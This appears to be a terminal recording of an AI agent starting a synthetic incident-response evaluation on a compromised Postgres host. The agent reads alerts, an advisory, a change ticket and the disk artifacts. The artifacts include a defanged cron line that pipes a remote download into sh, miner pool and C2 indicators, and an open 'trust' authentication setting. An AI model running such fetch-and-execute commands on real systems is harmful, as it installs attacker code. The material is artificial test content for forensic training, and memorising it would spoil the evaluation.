@@ -1,0 +1,1670 @@
+[?2004hroot@654d0bd251de:/app# asciinema rec --stdin /logs/agent/recording.cast
+[?2004l[0;32masciinema: recording asciicast to /logs/agent/recording.cast[0m
+[0;32masciinema: press <ctrl-d> or type "exit" when you're done[0m
+[?2004hroot@654d0bd251de:/app# clear
+[?2004l[H[J[3J[?2004hroot@654d0bd251de:/app# ls -la /app /sas /disk
+[?2004l/app:
+total 8
+drwxr-xr-x 2 root root 4096 Aug 16 17:45 [0m[01;34m.[0m
+drwxr-xr-x 1 root root 4096 Aug 16 17:45 [01;34m..[0m
+
+/disk:
+total 24
+dr-xr-xr-x 6 root root  4096 Aug 16 17:45 [01;34m.[0m
+drwxr-xr-x 1 root root  4096 Aug 16 17:45 [01;34m..[0m
+dr-xr-xr-x 3  502 staff 4096 Aug 16 14:28 [01;34metc[0m
+dr-xr-xr-x 3  502 staff 4096 Aug 16 14:28 [01;34mhome[0m
+dr-xr-xr-x 2  502 staff 4096 Aug 16 14:28 [01;34mroot[0m
+dr-xr-xr-x 5  502 staff 4096 Aug 16 14:28 [01;34mvar[0m
+
+/sas:
+total 28
+dr-xr-xr-x 1 root root 4096 Aug 16 17:45 [01;34m.[0m
+drwxr-xr-x 1 root root 4096 Aug 16 17:45 [01;34m..[0m
+-r--r--r-- 1 root root  660 Aug 16 14:03 alerts.json
+-r--r--r-- 1 root root  141 Aug 16 14:03 baseline.json
+dr-xr-xr-x 1 root root 4096 Aug 16 17:45 [01;34mcti[0m
+dr-xr-xr-x 1 root root 4096 Aug 16 17:45 [01;34mhandoff[0m
+-r--r--r-- 1 root root    3 Aug 16 14:03 vulns.json
+[?2004hroot@654d0bd251de:/app# ls -la /sas/cti /sas/handoff
+[?2004l/sas/cti:
+total 32
+dr-xr-xr-x 1 root root 4096 Aug 16 17:45 [0m[01;34m.[0m
+dr-xr-xr-x 1 root root 4096 Aug 16 17:45 [01;34m..[0m
+-r--r--r-- 1 root root  166 Aug 16 14:28 SOURCES.txt
+-r--r--r-- 1 root root 5267 Aug 16 14:28 [01;35madvisory-page-01.png[0m
+-r--r--r-- 1 root root 2453 Aug 16 14:28 advisory.pdf
+-r--r--r-- 1 root root 1601 Aug 16 14:28 advisory.txt
+-r--r--r-- 1 root root 2119 Aug 16 14:28 [01;35mcampaign-timeline.png[0m
+
+/sas/handoff:
+total 24
+dr-xr-xr-x 1 root root 4096 Aug 16 17:45 [01;34m.[0m
+dr-xr-xr-x 1 root root 4096 Aug 16 17:45 [01;34m..[0m
+-r--r--r-- 1 root root 1199 Aug 16 14:28 change-ticket.md
+-r--r--r-- 1 root root  348 Aug 16 14:28 findings.partial.json
+-r--r--r-- 1 root root  592 Aug 16 14:28 findings.schema.json
+-r--r--r-- 1 root root 1024 Aug 16 14:28 intake.pdf
+[?2004hroot@654d0bd251de:/app# cat /sas/alerts.json
+[?2004l[
+  {
+    "id": "ALERT-01",
+    "chk": "CHK-01",
+    "kind": "dropper",
+    "path": "/var/lib/pgsql/.local/pgdaemon",
+    "capability": "ENT-P01",
+    "summary": "dropper observed at /var/lib/pgsql/.local/pgdaemon"
+  },
+  {
+    "id": "ALERT-02",
+    "chk": "CHK-02",
+    "kind": "cron",
+    "path": "/var/spool/cron/postgres",
+    "capability": "PER-S01",
+    "summary": "cron observed at /var/spool/cron/postgres"
+  },
+  {
+    "id": "ALERT-03",
+    "chk": "CHK-06",
+    "kind": "postgres-baseline",
+    "path": "/var/lib/pgsql/data/pg_hba.conf",
+    "capability": "BAS-01",
+    "summary": "postgres-baseline observed at /var/lib/pgsql/data/pg_hba.conf"
+  }
+]
+[?2004hroot@654d0bd251de:/app# echo "---"
+[?2004l---
+[?2004hroot@654d0bd251de:/app# cat /sas/baseline.json
+[?2004l[
+  {
+    "chk": "CHK-06",
+    "path": "/var/lib/pgsql/data/pg_hba.conf",
+    "check": "postgres-baseline",
+    "capability": "BAS-01"
+  }
+]
+[?2004hroot@654d0bd251de:/app# echo "---"
+[?2004l---
+[?2004hroot@654d0bd251de:/app# cat /sas/vulns.json
+[?2004l[]
+[?2004hroot@654d0bd251de:/app# echo "---"
+[?2004l---
+[?2004hroot@654d0bd251de:/app# cat /sas/cti/advisory.txt
+[?2004lTHREAT INTELLIGENCE ADVISORY ‚Äî Postgres Copyprogram campaign
+============================================================
+
+Distribution: TLP:AMBER   Analyst handoff   Confidence: HIGH   (IOCs are defanged)
+Affected host: postgres-prod-01   Suspected origin IP: 198.51.100.214
+
+1. EXECUTIVE SUMMARY
+An external actor executed a multi-stage post-compromise sequence. Endpoint alerting covered only part of it; several persistence and anti-forensic actions were silent. Map every on-disk finding to the ATT&CK techniques below and flag which are NOT in the SAS alert feed.
+
+2. ATT&CK TECHNIQUE MAPPING (MITRE ATT&CK Enterprise)
+   T1078      Valid Accounts                             [stealth]  step 1: valid accounts (weak postgres superuser)
+   T1059.004  Unix Shell                                 [execution]  step 2: COPY TO PROGRAM shell execution
+   T1048.003  Exfiltration Over Unencrypted Non-C2 Protocol [exfiltration]  step 3: DNS-tunnel exfiltration
+   T1053.003  Cron                                       [execution]  step 4: cron persistence
+   T1543.002  Systemd Service                            [persistence]  step 5: systemd persistence
+   T1070.006  Timestomp                                  [stealth]  step 6: timestomp dropped files
+
+4. INDICATORS OF COMPROMISE (defanged)
+   ip     198.51.100.214
+   c2     update-postgres[.]example[.]cn
+   pool   stratum+tcp[:]//xmr[.]postgres[.]evil[:]3333
+   wallet 4A000000000000000000c5f08041507f
+
+Attribution: MITRE ATT&CK(R) (C) The MITRE Corporation, CC BY 4.0. CVE/CVSS from the U.S. National Vulnerability Database (public domain).
+[?2004hroot@654d0bd251de:/app# cat /sas/handoff/change-ticket.md
+[?2004l# CHANGE TICKET  CHG-6386  (DRAFT ‚Äî reconcile against your findings)
+
+> A previous shift pre-filled this remediation ticket from the SAS alerts ALONE. It is known
+> to be incomplete and contains stale/incorrect lines. Correct it IN PLACE against your own
+> investigation of /disk; cite evidence for every change. Do not author from scratch.
+
+| # | Action | Target | Status | Note |
+|---|--------|--------|--------|------|
+| 1 | Block source IP inbound | 203.0.113.9 | proposed | STALE: prior shift used the wrong IP; confirm the real origin from /disk |
+| 2 | Patch CVE-2019-0708 (BlueKeep) | RDP | proposed | WRONG: not the entry vector for this host ‚Äî verify against /sas/cti |
+| 3 | Remove cron miner | /var/spool/cron/root | DONE | UNVERIFIED: marked done with no evidence ‚Äî re-check |
+| 4 | (add) silent persistence you discover | /etc/pgdaemon.conf | TODO | ticket omits everything not alerted ‚Äî add the rest |
+
+## Reviewer checklist
+- [ ] Every action maps to a cited artifact under /disk or /sas
+- [ ] Fix the wrong IP (row 1) and wrong CVE (row 2)
+- [ ] Downgrade row 3 from DONE to VERIFIED-or-OPEN with evidence
+- [ ] Add the silent (non-alerted) artifacts the prior shift missed
+[?2004hroot@654d0bd251de:/app# echo "---"
+[?2004l---
+[?2004hroot@654d0bd251de:/app# cat /sas/handoff/findings.schema.json
+[?2004l{
+  "$schema": "http://json-schema.org/draft-07/schema#",
+  "title": "finding",
+  "type": "object",
+  "required": [
+    "chk",
+    "path",
+    "attck",
+    "confidence",
+    "evidence"
+  ],
+  "properties": {
+    "chk": {
+      "type": "string"
+    },
+    "path": {
+      "type": "string"
+    },
+    "attck": {
+      "type": "string",
+      "pattern": "^T\\d{4}(\\.\\d{3})?$"
+    },
+    "confidence": {
+      "enum": [
+        "low",
+        "medium",
+        "high"
+      ]
+    },
+    "evidence": {
+      "type": "string",
+      "description": "backtick-cited /disk or /sas path"
+    }
+  }
+}
+[?2004hroot@654d0bd251de:/app# echo "---"
+[?2004l---
+[?2004hroot@654d0bd251de:/app# cat /sas/handoff/findings.partial.json
+[?2004l{
+  "findings": [
+    {
+      "chk": "CHK-01",
+      "path": "/var/lib/pgsql/.local/pgdaemon",
+      "attck": "T1059.004",
+      "confidence": "high",
+      "evidence": "`/var/lib/pgsql/.local/pgdaemon`"
+    },
+    {
+      "chk": "TODO",
+      "path": "TODO",
+      "attck": "TODO",
+      "confidence": "TODO",
+      "evidence": "TODO"
+    }
+  ]
+}
+[?2004hroot@654d0bd251de:/app# cat /sas/cti/SOURCES.txt
+[?2004lMITRE ATT&CK(R): (C) The MITRE Corporation, CC BY 4.0 (attack.mitre.org).
+CVE/CVSS: U.S. National Vulnerability Database, nvd.nist.gov (public-domain U.S.-Gov work).
+[?2004hroot@654d0bd251de:/app# pdftotext /sas/handoff/intake.pdf -
+[?2004lSOC INCIDENT INTAKE ? postgres-copyprogram
+==========================================
+Reported by: monitoring (EDR high-severity alert cluster)
+Opened: 2026-08-23 03:20 UTC Priority: P1
+Initial alerts: see /sas/alerts.json (partial coverage).
+Handoff: alerts undercount persistence and anti-forensics; investigate the whole host and
+reconcile the attached change ticket.
+
+[?2004hroot@654d0bd251de:/app# echo "---"
+[?2004l---
+[?2004hroot@654d0bd251de:/app# pdftotext /sas/cti/advisory.pdf -
+[?2004lTHREAT INTELLIGENCE ADVISORY ? Postgres Copyprogram campaign
+============================================================
+Distribution: TLP:AMBER Analyst handoff Confidence: HIGH (IOCs are defanged)
+Affected host: postgres-prod-01 Suspected origin IP: 198.51.100.214
+1. EXECUTIVE SUMMARY
+An external actor executed a multi-stage post-compromise sequence. Endpoint alerting covered
+only part of it; several persistence and anti-forensic actions were silent. Map every on-disk
+finding to the ATT&CK techniques below and flag which are NOT in the SAS alert feed.
+2. ATT&CK TECHNIQUE MAPPING (MITRE ATT&CK Enterprise)
+T1078
+Valid Accounts
+[stealth] step 1: valid accounts
+(weak postgres superuser)
+T1059.004 Unix Shell
+[execution] step 2: COPY TO PROGRAM
+shell execution
+T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol [exfiltration] step 3: DNS-tunnel
+exfiltration
+T1053.003 Cron
+[execution] step 4: cron persistence
+T1543.002 Systemd Service
+[persistence] step 5: systemd
+persistence
+T1070.006 Timestomp
+[stealth] step 6: timestomp dropped
+files
+4. INDICATORS OF COMPROMISE (defanged)
+ip 198.51.100.214
+c2 update-postgres[.]example[.]cn
+pool stratum+tcp[:]//xmr[.]postgres[.]evil[:]3333
+wallet 4A000000000000000000c5f08041507f
+Attribution: MITRE ATT&CK(R) (C) The MITRE Corporation, CC BY 4.0. CVE/CVSS from the U.S.
+National Vulnerability Database (public domain).
+
+[?2004hroot@654d0bd251de:/app# find /disk/var/spool/cron /disk/etc/systemd /disk/var/lib/pgsql -maxdepth 4 2>/dev/null
+[?2004l/disk/var/spool/cron
+/disk/var/spool/cron/postgres
+/disk/etc/systemd
+/disk/etc/systemd/system
+/disk/etc/systemd/system/pg-metrics.service
+/disk/etc/systemd/system/pg-backup.service
+/disk/var/lib/pgsql
+/disk/var/lib/pgsql/data
+/disk/var/lib/pgsql/data/pg_hba.conf
+/disk/var/lib/pgsql/.local
+/disk/var/lib/pgsql/.local/pgdaemon
+/disk/var/lib/pgsql/.local/.timestamps
+[?2004hroot@654d0bd251de:/app# ls -la /disk/var/log /disk/root /disk/home
+[?2004l/disk/home:
+total 12
+dr-xr-xr-x 3  502 staff 4096 Aug 16 14:28 [0m[01;34m.[0m
+dr-xr-xr-x 6 root root  4096 Aug 16 17:45 [01;34m..[0m
+dr-xr-xr-x 2  502 staff 4096 Aug 16 14:28 [01;34mdevops[0m
+
+/disk/root:
+total 12
+dr-xr-xr-x 2  502 staff 4096 Aug 16 14:28 [01;34m.[0m
+dr-xr-xr-x 6 root root  4096 Aug 16 17:45 [01;34m..[0m
+-r--r--r-- 1  502 staff   63 Aug 16 14:28 .bashrc
+
+/disk/var/log:
+total 128
+dr-xr-xr-x 2 502 staff  4096 Aug 16 14:28 [01;34m.[0m
+dr-xr-xr-x 5 502 staff  4096 Aug 16 14:28 [01;34m..[0m
+-r--r--r-- 1 502 staff 15919 Aug 16 14:28 kern.log
+-r--r--r-- 1 502 staff 34766 Aug 16 14:28 messages
+-r--r--r-- 1 502 staff 60233 Aug 16 14:28 secure
+-r--r--r-- 1 502 staff  2672 Aug 16 14:28 [01;31msecure.1.gz[0m
+-r--r--r-- 1 502 staff  1815 Aug 16 14:28 wtmp.csv
+[?2004hroot@654d0bd251de:/app# cat /disk/var/spool/cron/postgres
+[?2004l# m h dom mon dow user command
+0 3 * * * root /usr/local/bin/backup.sh
+30 4 * * 0 root /usr/sbin/logrotate /etc/logrotate.conf
+*/15 * * * * nobody /usr/bin/check-health.sh
+# * * * * * root <defanged beacon: curl hxxp://198.51.100.214/x | sh> ‚Äî cron persistence re-drops xmrig / pgdaemon / php / redis / wget payload
+[?2004hroot@654d0bd251de:/app# echo "==="
+[?2004l===
+[?2004hroot@654d0bd251de:/app# cat /disk/etc/systemd/system/pg-metrics.service
+[?2004l[Unit]
+Description=System Update Helper
+After=network.target
+[Service]
+ExecStart launches an xmrig / pgdaemon re-dropper (defanged)
+[Install]
+WantedBy=multi-user.target
+[?2004hroot@654d0bd251de:/app# echo "==="
+[?2004l===
+[?2004hroot@654d0bd251de:/app# cat /disk/etc/systemd/system/pg-backup.service
+[?2004l# scheduled maintenance (BENIGN ‚Äî legitimate ops job)
+0 3 * * * root /usr/local/bin/backup.sh --remote 10.10.31
+# looks unusual but is an approved change (see /sas/handoff)
+[?2004hroot@654d0bd251de:/app# echo "==="
+[?2004l===
+[?2004hroot@654d0bd251de:/app# cat /disk/var/lib/pgsql/.local/.timestamps
+[?2004l# .timestamps
+timestomp anti-forensics: mtime backdated to match /bin/ls
+[?2004hroot@654d0bd251de:/app# ls -la /disk/var/lib/pgsql/data
+[?2004ltotal 12
+dr-xr-xr-x 2 502 staff 4096 Aug 16 14:28 [0m[01;34m.[0m
+dr-xr-xr-x 4 502 staff 4096 Aug 16 14:28 [01;34m..[0m
+-r--r--r-- 1 502 staff   85 Aug 16 14:28 pg_hba.conf
+[?2004hroot@654d0bd251de:/app# ls -la /disk/home/devops
+[?2004ltotal 12
+dr-xr-xr-x 2 502 staff 4096 Aug 16 14:28 [0m[01;34m.[0m
+dr-xr-xr-x 3 502 staff 4096 Aug 16 14:28 [01;34m..[0m
+-r--r--r-- 1 502 staff   38 Aug 16 14:28 .bash_history
+[?2004hroot@654d0bd251de:/app# ls -la /disk/var/lib/pgsql/.local
+[?2004ltotal 16
+dr-xr-xr-x 2 502 staff 4096 Aug 16 14:28 [0m[01;34m.[0m
+dr-xr-xr-x 4 502 staff 4096 Aug 16 14:28 [01;34m..[0m
+-r--r--r-- 1 502 staff   73 Aug 16 14:28 .timestamps
+-r--r--r-- 1 502 staff 2234 Aug 16 14:28 pgdaemon
+[?2004hroot@654d0bd251de:/app# cat /disk/var/lib/pgsql/data/pg_hba.conf
+[?2004l# pg_hba.conf (managed)
+
+pg_hba.conf grants 'trust' auth for 0.0.0.0/0 (no password)
+[?2004hroot@654d0bd251de:/app# echo "==="
+[?2004l===
+[?2004hroot@654d0bd251de:/app# cat /disk/home/devops/.bash_history
+[?2004lcd /srv
+ls
+sudo systemctl restart app
+[?2004hroot@654d0bd251de:/app# echo "==="
+[?2004l===
+[?2004hroot@654d0bd251de:/app# cat /disk/var/lib/pgsql/.local/pgdaemon
+[?2004lSYNTHETIC-INERT-SAMPLE (dropper) ? not a runnable executable; content defanged for a DFIR evaluation. Original was a dropped binary; compute sha256 to record its hash.
+
+dropper writes a 'postgres'-named daemon stager to /tmp (defanged)
+pool stratum+tcp[:]//xmr[.]postgres[.]evil[:]3333
+wallet 4A000000000000000000c5f08041507f
+config.json
+
+--- pseudo hexdump (benign filler) ---
+00000000  0b 30 55 7a 1f 44 69 0e 33 58 7d 22 47 6c 11 36
+00000010  5b 00 25 4a 6f 14 39 5e 03 28 4d 72 17 3c 61 06
+00000020  2b 50 75 1a 3f 64 09 2e 53 78 1d 42 67 0c 31 56
+00000030  7b 20 45 6a 0f 34 59 7e 23 48 6d 12 37 5c 01 26
+00000040  4b 70 15 3a 5f 04 29 4e 73 18 3d 62 07 2c 51 76
+00000050  1b 40 65 0a 2f 54 79 1e 43 68 0d 32 57 7c 21 46
+00000060  6b 10 35 5a 7f 24 49 6e 13 38 5d 02 27 4c 71 16
+00000070  3b 60 05 2a 4f 74 19 3e 63 08 2d 52 77 1c 41 66
+00000080  0b 30 55 7a 1f 44 69 0e 33 58 7d 22 47 6c 11 36
+00000090  5b 00 25 4a 6f 14 39 5e 03 28 4d 72 17 3c 61 06
+000000a0  2b 50 75 1a 3f 64 09 2e 53 78 1d 42 67 0c 31 56
+000000b0  7b 20 45 6a 0f 34 59 7e 23 48 6d 12 37 5c 01 26
+000000c0  4b 70 15 3a 5f 04 29 4e 73 18 3d 62 07 2c 51 76
+000000d0  1b 40 65 0a 2f 54 79 1e 43 68 0d 32 57 7c 21 46
+000000e0  6b 10 35 5a 7f 24 49 6e 13 38 5d 02 27 4c 71 16
+000000f0  3b 60 05 2a 4f 74 19 3e 63 08 2d 52 77 1c 41 66
+00000100  0b 30 55 7a 1f 44 69 0e 33 58 7d 22 47 6c 11 36
+00000110  5b 00 25 4a 6f 14 39 5e 03 28 4d 72 17 3c 61 06
+00000120  2b 50 75 1a 3f 64 09 2e 53 78 1d 42 67 0c 31 56
+00000130  7b 20 45 6a 0f 34 59 7e 23 48 6d 12 37 5c 01 26
+00000140  4b 70 15 3a 5f 04 29 4e 73 18 3d 62 07 2c 51 76
+00000150  1b 40 65 0a 2f 54 79 1e 43 68 0d 32 57 7c 21 46
+00000160  6b 10 35 5a 7f 24 49 6e 13 38 5d 02 27 4c 71 16
+00000170  3b 60 05 2a 4f 74 19 3e 63 08 2d 52 77 1c 41 66
+00000180  0b 30 55 7a 1f 44 69 0e 33 58 7d 22 47 6c 11 36
+00000190  5b 00 25 4a 6f 14 39 5e 03 28 4d 72 17 3c 61 06
+000001a0  2b 50 75 1a 3f 64 09 2e 53 78 1d 42 67 0c 31 56
+000001b0  7b 20 45 6a 0f 34 59 7e 23 48 6d 12 37 5c 01 26
+000001c0  4b 70 15 3a 5f 04 29 4e 73 18 3d 62 07 2c 51 76
+000001d0  1b 40 65 0a 2f 54 79 1e 43 68 0d 32 57 7c 21 46
+000001e0  6b 10 35 5a 7f 24 49 6e 13 38 5d 02 27 4c 71 16
+000001f0  3b 60 05 2a 4f 74 19 3e 63 08 2d 52 77 1c 41 66
+[?2004hroot@654d0bd251de:/app# ls -la /disk/var/log/
+[?2004ltotal 128
+dr-xr-xr-x 2 502 staff  4096 Aug 16 14:28 [0m[01;34m.[0m
+dr-xr-xr-x 5 502 staff  4096 Aug 16 14:28 [01;34m..[0m
+-r--r--r-- 1 502 staff 15919 Aug 16 14:28 kern.log
+-r--r--r-- 1 502 staff 34766 Aug 16 14:28 messages
+-r--r--r-- 1 502 staff 60233 Aug 16 14:28 secure
+-r--r--r-- 1 502 staff  2672 Aug 16 14:28 [01;31msecure.1.gz[0m
+-r--r--r-- 1 502 staff  1815 Aug 16 14:28 wtmp.csv
+[?2004hroot@654d0bd251de:/app# cat /disk/var/log/wtmp.csv
+[?2004luser,tty,from,login,duration
+webadmin,pts/6,10.10.31.128,Aug 22 09:21,65m
+postgres,pts/2,10.10.31.151,Aug 19 09:43,71m
+svc-backup,pts/5,10.10.31.110,Aug 23 09:38,137m
+postgres,pts/0,10.10.31.109,Aug 23 09:24,43m
+svc-backup,pts/1,10.10.31.60,Aug 23 09:46,201m
+jenkins,pts/2,10.10.31.130,Aug 23 09:01,291m
+webadmin,pts/4,10.10.31.210,Aug 19 09:03,366m
+devops,pts/0,10.10.31.25,Aug 22 09:00,356m
+postgres,pts/2,10.10.31.218,Aug 20 09:27,356m
+jenkins,pts/2,10.10.31.208,Aug 19 09:19,47m
+postgres,pts/1,10.10.31.236,Aug 18 09:20,145m
+webadmin,pts/0,10.10.31.26,Aug 23 09:14,241m
+webadmin,pts/3,10.10.31.91,Aug 23 09:08,331m
+webadmin,pts/6,10.10.31.175,Aug 23 09:16,101m
+jenkins,pts/1,10.10.31.222,Aug 18 09:31,29m
+postgres,pts/4,10.10.31.188,Aug 20 09:03,179m
+jenkins,pts/5,10.10.31.125,Aug 23 09:38,283m
+jenkins,pts/1,10.10.31.123,Aug 20 09:56,249m
+jenkins,pts/4,10.10.31.34,Aug 21 09:51,305m
+devops,pts/4,10.10.31.197,Aug 23 09:07,123m
+root,pts/6,10.10.31.68,Aug 23 09:44,374m
+postgres,pts/1,10.10.31.37,Aug 20 09:06,375m
+jenkins,pts/5,10.10.31.192,Aug 20 09:53,264m
+jenkins,pts/1,10.10.31.200,Aug 23 09:07,193m
+webadmin,pts/1,10.10.31.180,Aug 21 09:51,238m
+postgres,pts/4,10.10.31.15,Aug 18 09:31,249m
+svc-backup,pts/2,10.10.31.126,Aug 21 09:19,155m
+jenkins,pts/1,10.10.31.76,Aug 18 09:30,256m
+root,pts/3,10.10.31.9,Aug 20 09:03,256m
+root,pts/0,10.10.31.65,Aug 22 09:08,362m
+jenkins,pts/3,10.10.31.133,Aug 23 09:00,185m
+webadmin,pts/3,10.10.31.25,Aug 18 09:38,292m
+postgres,pts/3,10.10.31.15,Aug 18 09:30,339m
+root,pts/3,10.10.31.138,Aug 18 09:06,373m
+jenkins,pts/3,10.10.31.154,Aug 19 09:11,128m
+postgres,pts/3,10.10.31.65,Aug 23 09:32,54m
+devops,pts/2,10.10.31.161,Aug 21 09:43,209m
+jenkins,pts/5,10.10.31.180,Aug 18 09:26,243m
+root,pts/0,10.10.31.214,Aug 21 09:46,150m
+postgres,pts/3,10.10.31.140,Aug 23 09:07,88m
+[?2004hroot@654d0bd251de:/app# grep -i -E "198.51.100|postgres|copy|pgdaemon|cron|systemd|dns" /disk/var/log/secure /disk/var/log/messages /disk/var/log/kern.log | head -n 40
+[?2004l/disk/var/log/secure:Aug 23 00:33:58 postgres-prod-01 sshd[6372]: Received disconnect from 10.10.31.191 port 47199:11: disconnected by user
+/disk/var/log/secure:Aug 23 00:34:22 postgres-prod-01 sshd[7101]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+/disk/var/log/secure:Aug 23 00:34:52 postgres-prod-01 sshd[5712]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+/disk/var/log/secure:Aug 23 00:35:30 postgres-prod-01 sshd[2036]: Accepted publickey for postgres from 10.10.31.96 port 62718 ssh2: RSA SHA256:1a4d84ef
+/disk/var/log/secure:Aug 23 00:35:47 postgres-prod-01 sshd[2143]: Accepted publickey for root from 10.10.31.65 port 59115 ssh2: RSA SHA256:68236d47
+/disk/var/log/secure:Aug 23 00:35:50 postgres-prod-01 sshd[3328]: pam_unix(sshd:session): session opened for user root by (uid=0)
+/disk/var/log/secure:Aug 23 00:36:00 postgres-prod-01 sshd[3980]: Received disconnect from 10.10.31.104 port 56149:11: disconnected by user
+/disk/var/log/secure:Aug 23 00:36:07 postgres-prod-01 sshd[4690]: Accepted publickey for svc-backup from 10.10.31.20 port 53035 ssh2: RSA SHA256:004b7459
+/disk/var/log/secure:Aug 23 00:36:36 postgres-prod-01 sshd[7136]: Accepted publickey for devops from 10.10.31.71 port 41691 ssh2: RSA SHA256:16304ca3
+/disk/var/log/secure:Aug 23 00:36:59 postgres-prod-01 sshd[8181]: Received disconnect from 10.10.31.89 port 40271:11: disconnected by user
+/disk/var/log/secure:Aug 23 00:37:41 postgres-prod-01 sshd[4267]: pam_unix(sudo:session): session opened for user root by jenkins(uid=1001)
+/disk/var/log/secure:Aug 23 00:37:49 postgres-prod-01 sshd[2117]: pam_unix(sudo:session): session opened for user root by jenkins(uid=1005)
+/disk/var/log/secure:Aug 23 00:38:22 postgres-prod-01 sshd[6978]: Received disconnect from 10.10.31.219 port 51252:11: disconnected by user
+/disk/var/log/secure:Aug 23 00:38:51 postgres-prod-01 sshd[7580]: Received disconnect from 10.10.31.171 port 47594:11: disconnected by user
+/disk/var/log/secure:Aug 23 00:39:33 postgres-prod-01 sshd[1542]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+/disk/var/log/secure:Aug 23 00:40:12 postgres-prod-01 sshd[2210]: Received disconnect from 10.10.31.214 port 42469:11: disconnected by user
+/disk/var/log/secure:Aug 23 00:40:24 postgres-prod-01 sshd[7098]: Received disconnect from 10.10.31.216 port 64408:11: disconnected by user
+/disk/var/log/secure:Aug 23 00:40:50 postgres-prod-01 sshd[1458]: pam_unix(sudo:session): session opened for user root by devops(uid=1000)
+/disk/var/log/secure:Aug 23 00:41:08 postgres-prod-01 sshd[5991]: Accepted publickey for root from 10.10.31.6 port 59643 ssh2: RSA SHA256:14e664f7
+/disk/var/log/secure:Aug 23 00:41:23 postgres-prod-01 sshd[5505]: Received disconnect from 10.10.31.94 port 63261:11: disconnected by user
+/disk/var/log/secure:Aug 23 00:42:07 postgres-prod-01 sshd[7695]: pam_unix(sudo:session): session opened for user root by devops(uid=1003)
+/disk/var/log/secure:Aug 23 00:42:23 postgres-prod-01 sshd[2378]: pam_unix(sshd:session): session opened for user root by (uid=0)
+/disk/var/log/secure:Aug 23 00:42:53 postgres-prod-01 sshd[3072]: Received disconnect from 10.10.31.17 port 64726:11: disconnected by user
+/disk/var/log/secure:Aug 23 00:43:01 postgres-prod-01 sshd[1073]: Accepted publickey for jenkins from 10.10.31.64 port 57479 ssh2: RSA SHA256:032e4426
+/disk/var/log/secure:Aug 23 00:43:32 postgres-prod-01 sshd[5526]: pam_unix(sudo:session): session opened for user root by root(uid=1004)
+/disk/var/log/secure:Aug 23 00:44:05 postgres-prod-01 sshd[8905]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+/disk/var/log/secure:Aug 23 00:44:16 postgres-prod-01 sshd[8309]: pam_unix(sudo:session): session opened for user root by jenkins(uid=1003)
+/disk/var/log/secure:Aug 23 00:44:17 postgres-prod-01 sshd[7684]: pam_unix(sshd:session): session opened for user postgres by (uid=0)
+/disk/var/log/secure:Aug 23 00:44:29 postgres-prod-01 sshd[3079]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+/disk/var/log/secure:Aug 23 00:44:43 postgres-prod-01 sshd[8544]: Accepted publickey for jenkins from 10.10.31.219 port 50767 ssh2: RSA SHA256:65e488b1
+/disk/var/log/secure:Aug 23 00:45:07 postgres-prod-01 sshd[3553]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+/disk/var/log/secure:Aug 23 00:45:23 postgres-prod-01 sshd[2308]: Accepted publickey for webadmin from 10.10.31.135 port 43216 ssh2: RSA SHA256:58d3b5fc
+/disk/var/log/secure:Aug 23 00:45:39 postgres-prod-01 sshd[6321]: Received disconnect from 10.10.31.118 port 59577:11: disconnected by user
+/disk/var/log/secure:Aug 23 00:45:59 postgres-prod-01 sshd[4236]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+/disk/var/log/secure:Aug 23 00:46:05 postgres-prod-01 sshd[7865]: Received disconnect from 10.10.31.151 port 46894:11: disconnected by user
+/disk/var/log/secure:Aug 23 00:46:43 postgres-prod-01 sshd[5375]: pam_unix(sudo:session): session opened for user root by devops(uid=1004)
+/disk/var/log/secure:Aug 23 00:46:57 postgres-prod-01 sshd[3011]: Received disconnect from 10.10.31.148 port 62806:11: disconnected by user
+/disk/var/log/secure:Aug 23 00:47:12 postgres-prod-01 sshd[3790]: pam_unix(sudo:session): session opened for user root by svc-backup(uid=1004)
+/disk/var/log/secure:Aug 23 00:47:36 postgres-prod-01 sshd[3484]: Accepted publickey for svc-backup from 10.10.31.154 port 41869 ssh2: RSA SHA256:6ff93ae9
+/disk/var/log/secure:Aug 23 00:47:42 postgres-prod-01 sshd[3939]: Received disconnect from 10.10.31.240 port 40814:11: disconnected by user
+[?2004hroot@654d0bd251de:/app# zcat /disk/var/log/secure.1.gz 2>/dev/null | grep -i -E "198.51.100|postgres|copy|pgdaemon|cron|systemd|dns" | head -n 40
+[?2004lAug 23 00:33:29 postgres-prod-01 sshd[8405]: Accepted publickey for svc-backup from 10.10.31.96 port 50782 ssh2: RSA SHA256:77c8ccc5
+Aug 23 00:33:47 postgres-prod-01 sshd[2230]: Received disconnect from 10.10.31.79 port 40921:11: disconnected by user
+Aug 23 00:34:23 postgres-prod-01 sshd[4415]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 23 00:34:37 postgres-prod-01 sshd[2249]: pam_unix(sudo:session): session opened for user root by jenkins(uid=1003)
+Aug 23 00:35:02 postgres-prod-01 sshd[4231]: Received disconnect from 10.10.31.34 port 43316:11: disconnected by user
+Aug 23 00:35:41 postgres-prod-01 sshd[1918]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Aug 23 00:36:07 postgres-prod-01 sshd[8574]: Accepted publickey for devops from 10.10.31.219 port 43287 ssh2: RSA SHA256:12a44d87
+Aug 23 00:36:22 postgres-prod-01 sshd[3861]: pam_unix(sudo:session): session opened for user root by postgres(uid=1004)
+Aug 23 00:36:56 postgres-prod-01 sshd[1165]: pam_unix(sshd:session): session opened for user webadmin by (uid=0)
+Aug 23 00:37:38 postgres-prod-01 sshd[1239]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 23 00:37:39 postgres-prod-01 sshd[7381]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+Aug 23 00:38:01 postgres-prod-01 sshd[5471]: Accepted publickey for devops from 10.10.31.49 port 47042 ssh2: RSA SHA256:2d972415
+Aug 23 00:38:03 postgres-prod-01 sshd[1824]: Accepted publickey for webadmin from 10.10.31.187 port 62959 ssh2: RSA SHA256:1ffd813a
+Aug 23 00:38:37 postgres-prod-01 sshd[7424]: Accepted publickey for root from 10.10.31.102 port 59489 ssh2: RSA SHA256:0254372c
+Aug 23 00:39:07 postgres-prod-01 sshd[3121]: pam_unix(sshd:session): session opened for user postgres by (uid=0)
